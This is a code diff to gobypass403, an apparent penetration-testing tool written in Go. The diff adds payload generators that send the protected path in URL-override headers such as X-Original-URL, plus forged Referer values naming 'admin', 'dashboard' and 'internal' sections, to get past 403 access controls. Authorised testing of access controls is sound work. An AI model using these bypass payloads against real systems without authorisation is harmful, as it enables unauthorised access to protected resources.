@@ -8,6 +8,10 @@ import (
 	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
 )
 
+// refererTrustWords are the trusted-section words unKover sends as
+// scheme://host/<word> Referers (referer_trust parity, spec addendum).
+var refererTrustWords = []string{"admin", "dashboard", "internal"}
+
 /*
 GenerateHeadersURLPayloads generates payloads by injecting various URL components
 (base path, parent paths, full URLs) into different headers.
@@ -116,6 +120,44 @@ func (pg *PayloadGenerator) GenerateHeadersURLPayloads(targetURL string, bypassM
 			}}
 			job.PayloadToken = GeneratePayloadToken(job)
 			allJobs = append(allJobs, job)
+		}
+
+		// Full path in header ON the original request-target (unKover
+		// header_override shape: e.g. X-Original-URL sent TO the protected
+		// path, not only to "/").
+		job = baseJob
+		job.RawURI = fullPathWithQuery
+		job.Headers = []Headers{{
+			Header: headerURL,
+			Value:  parsedURL.Path,
+		}}
+		job.PayloadToken = GeneratePayloadToken(job)
+		allJobs = append(allJobs, job)
+
+		if query != "" {
+			job := baseJob
+			job.RawURI = fullPathWithQuery
+			job.Headers = []Headers{{
+				Header: headerURL,
+				Value:  parsedURL.Path + query,
+			}}
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+		}
+
+		// Referer trust words (unKover referer_trust shape): trusted-section
+		// Referers scheme://host/<word> on the original request-target.
+		if strings.Contains(strings.ToLower(headerURL), "refer") {
+			for _, word := range refererTrustWords {
+				job := baseJob
+				job.RawURI = fullPathWithQuery
+				job.Headers = []Headers{{
+					Header: headerURL,
+					Value:  fmt.Sprintf("%s://%s/%s", parsedURL.Scheme, parsedURL.Host, word),
+				}}
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
 		}
 
 		// Parent paths variants
